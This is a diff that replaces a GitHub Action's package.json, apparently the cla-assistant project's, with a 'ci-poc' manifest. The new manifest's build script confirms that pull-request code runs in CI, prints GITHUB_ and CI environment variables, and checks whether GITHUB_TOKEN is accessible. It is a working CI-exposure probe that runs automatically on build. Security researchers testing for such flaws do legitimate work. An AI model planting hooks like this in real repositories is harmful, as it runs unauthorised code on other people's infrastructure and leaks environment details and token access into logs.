@@ -1,39 +1,8 @@
 {
-  "name": "github-action",
-  "version": "0.0.1",
-  "description": "GitHub Action for storing CLA signatures",
-  "main": "lib/main.js",
+  "name": "ci-poc",
+  "version": "1.0.0",
+  "description": "Safe PoC for GitHub Actions env exposure",
   "scripts": {
-    "test": "jest",
-    "build": "ncc build ./src/main.ts -o ./lib -m "
-  },
-  "repository": {
-    "type": "git",
-    "url": "git+https://github.com/cla-assistant/github-action.git"
-  },
-  "keywords": [
-    "actions",
-    "node",
-    "setup"
-  ],
-  "dependencies": {
-    "@actions/core": "^1.10.1",
-    "@actions/github": "^3.0.0",
-    "node-fetch": "^2.7.0"
-  },
-  "devDependencies": {
-    "@types/jest": "^29.5.8",
-    "@types/node": "^20.12.7",
-    "@types/node-fetch": "^2.6.9",
-    "@vercel/ncc": "^0.38.1",
-    "jest": "^29.7.0",
-    "ts-jest": "^29.1.1",
-    "typescript": "^5.4.5"
-  },
-  "author": "ibakshay",
-  "license": "Apache-2.0",
-  "bugs": {
-    "url": "https://github.com/cla-assistant/github-action/issues"
-  },
-  "homepage": "https://github.com/cla-assistant/github-action#readme"
+    "build": "echo \"[POC] PR-controlled code execution confirmed\" && echo \"--- ENV VARIABLES (filtered) ---\" && env | grep -E 'GITHUB_|CI' && echo \"--- TOKEN CHECK ---\" && if [ -n \"$GITHUB_TOKEN\" ]; then echo \"GITHUB_TOKEN is accessible (length: ${#GITHUB_TOKEN})\"; else echo \"GITHUB_TOKEN not available\"; fi"
+  }
 }
